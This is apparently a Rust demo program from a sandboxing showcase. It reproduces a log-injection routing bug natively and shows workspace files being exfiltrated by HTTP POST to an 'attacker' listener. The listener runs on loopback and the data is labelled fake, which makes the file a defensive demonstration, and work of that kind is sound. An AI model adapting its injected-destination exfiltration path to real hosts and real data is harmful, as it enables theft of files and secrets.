//! Native baseline for the egress-exfil sandbox demo (MITRE ATT&CK T1041).
//!
//! The same log shipper, the same bug, the same poisoned log line, with no
//! sandbox. `workspace.rs` is compiled straight from the component's source
//! tree, so the routing bug here is byte for byte the one in the sandbox.
//!
//! A native process has ambient network authority: it can open a socket to
//! anything it can route to. So the exfiltration simply works.
//!
//! To show that without sending anything anywhere, the "attacker" is a
//! listener this program starts itself on 127.0.0.1 (an ephemeral port). The
//! workspace is the same inert, labelled-fake text the component carries.
//! Nothing leaves the machine, and there is deliberately no option to aim it
//! at another host.

#[path = "../../cosmonic-app/shipper/src/workspace.rs"]
#[allow(dead_code)] // the clean batch and the reserved attacker hosts are only used in the sandbox
mod workspace;

use std::io::{Read, Write};
use std::net::{TcpListener, TcpStream};
use std::sync::mpsc;
use std::thread;
use std::time::Duration;

fn main() -> std::io::Result<()> {
    // The "attacker's server": a loopback listener owned by this process.
    let listener = TcpListener::bind("127.0.0.1:0")?;
    let port = listener.local_addr()?.port();
    let attacker_url = format!("http://127.0.0.1:{port}/collect");
    let (tx, rx) = mpsc::channel::<Vec<u8>>();
    thread::spawn(move || {
        if let Ok((mut conn, _)) = listener.accept() {
            let body = read_request_body(&mut conn);
            let _ = conn.write_all(b"HTTP/1.1 200 OK\r\ncontent-length: 3\r\nconnection: close\r\n\r\nok\n");
            let _ = tx.send(body);
        }
    });

    println!("== egress-exfil native baseline: no sandbox ==\n");
    println!("attacker listener (this process, loopback only): {attacker_url}");

    // The shipper's own code path, unchanged.
    let batch = workspace::poisoned_batch(&attacker_url);
    let route = workspace::route(&batch, workspace::DEFAULT_SINK_URL);
    let payload = workspace::payload(&batch, route.include_workspace);

    println!("configured sink:   {}", workspace::DEFAULT_SINK_URL);
    if let Some(line) = &route.injected_by {
        println!("poisoned log line: {line}");
    }
    println!("shipper now sends: {} ({} bytes, workspace attached: {})\n", route.destination, payload.len(), route.include_workspace);

    // Native egress: a plain socket. Nothing asks whether this host is allowed.
    let authority = format!("127.0.0.1:{port}");
    let mut stream = TcpStream::connect(&authority)?;
    stream.set_read_timeout(Some(Duration::from_secs(5)))?;
    write!(
        stream,
        "POST /collect HTTP/1.1\r\nhost: {authority}\r\ncontent-type: text/plain; charset=utf-8\r\ncontent-length: {}\r\nconnection: close\r\n\r\n",
        payload.len()
    )?;
    stream.write_all(&payload)?;
    let mut reply = String::new();
    let _ = stream.read_to_string(&mut reply);
    let status = reply.lines().next().unwrap_or("(no reply)");
    println!("attacker replied:  {status}");

    match rx.recv_timeout(Duration::from_secs(5)) {
        Ok(received) => {
            let text = String::from_utf8_lossy(&received);
            let files = workspace::WORKSPACE.iter().filter(|(name, _)| text.contains(&format!("workspace/{name}"))).count();
            println!("attacker received: {} bytes, {files} of {} workspace files\n", received.len(), workspace::WORKSPACE.len());
            println!("---- what the attacker now holds (inert demo data) ----");
            for line in text.lines().take(14) {
                println!("  {line}");
            }
            println!("  ...\n");
            if received.len() == payload.len() && files == workspace::WORKSPACE.len() {
                println!(
                    "VULNERABLE: {} bytes exfiltrated, {files} workspace files delivered to the attacker. Nothing refused the connection.",
                    received.len()
                );
            } else {
                println!("PARTIAL: the attacker received {} of {} bytes.", received.len(), payload.len());
            }
        }
        Err(_) => println!("the listener received nothing"),
    }
    println!("\nNow ask the sandboxed shipper to do the same thing:");
    println!("  curl -s -H 'Host: egress-exfil-sandbox.localhost' 'http://127.0.0.1:8200/run?mode=exfil'");
    Ok(())
}

/// Read one HTTP request and return its body (content-length framed).
fn read_request_body(conn: &mut TcpStream) -> Vec<u8> {
    let _ = conn.set_read_timeout(Some(Duration::from_secs(5)));
    let mut buf = Vec::new();
    let mut chunk = [0u8; 4096];
    loop {
        let header_end = buf.windows(4).position(|w| w == b"\r\n\r\n");
        if let Some(end) = header_end {
            let head = String::from_utf8_lossy(&buf[..end]).to_ascii_lowercase();
            let length = head
                .lines()
                .find_map(|l| l.strip_prefix("content-length:"))
                .and_then(|v| v.trim().parse::<usize>().ok())
                .unwrap_or(0);
            if buf.len() >= end + 4 + length {
                return buf[end + 4..end + 4 + length].to_vec();
            }
        }
        match conn.read(&mut chunk) {
            Ok(0) | Err(_) => return Vec::new(),
            Ok(n) => buf.extend_from_slice(&chunk[..n]),
        }
    }
}
